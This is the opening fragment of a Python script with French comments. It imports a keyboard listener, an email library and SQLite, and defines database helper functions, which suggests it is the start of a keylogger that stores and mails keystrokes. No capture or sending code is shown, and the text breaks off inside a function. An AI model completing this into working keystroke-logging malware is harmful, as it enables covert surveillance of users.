import ctypes
import ctypes.util
import threading
import sqlite3
from sqlite3 import Error
import time
from pynput.keyboard import Key, Listener
from time import time, sleep
from datetime import datetime
import smtplib
from socket import gaierror
import sys

#Creation de la base de donnee
def create_connection(db_file):
    """ create a database connection to the SQLite database
        specified by the db_file
    :param db_file: database file
    :return: Connection object or None
    """
    try:
        conn = sqlite3.connect(db_file)
        return conn
    except Error as e:
        print(e)
 
    return None


#Creation de la table
def create_table(conn, create_table_sql):
    """ create a table from the create_table_sql statement
    :param conn: Connection object
    :param create_table_sql: a CREATE TABLE statement
    :return:
    """
